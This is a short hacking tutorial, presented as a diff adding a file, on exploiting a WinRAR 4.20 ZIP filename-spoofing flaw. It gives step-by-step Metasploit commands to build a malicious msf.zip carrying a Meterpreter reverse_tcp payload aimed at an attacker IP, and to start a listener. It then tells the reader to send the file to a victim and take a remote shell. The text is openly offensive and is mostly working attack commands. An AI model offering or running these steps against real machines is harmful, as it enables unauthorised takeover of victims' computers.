@@ -1,0 +1,25 @@
+
+Hack Remote Windows PC using WinRAR Filename Spoofing
+
+This module abuses a filename spoofing vulnerability in WinRAR. The vulnerability exists when opening ZIP files. The file names showed in WinRAR when opening a ZIP file come from the central directory, but the file names used to extract and open contents come from the Local File Header. This inconsistency allows to spoof file names when opening ZIP files with WinRAR, which can be abused to execute arbitrary code, as exploited in the wild in March 2014
+WinRAR 4.20
+Attacker: kali Linux
+Victim PC: Windows 7
+Open Kali terminal type msfconsole
+
+Now type use exploit/windows/fileformat/winrar_name_spoofing
+msf exploit (winrar_name_spoofing)>set payload windows/meterpreter/reverse_tcp
+msf exploit (winrar_name_spoofing)>set lhost 192.168.1.7 (IP of Local Host)
+msf exploit (winrar_name_spoofing)>exploit
+
+After we successfully generate the malicious zip File, it will stored on your local computer
+/root/.msf4/local/msf.zip
+
+Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.7
+exploit
+Now send your msf.zip files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer 
+
+
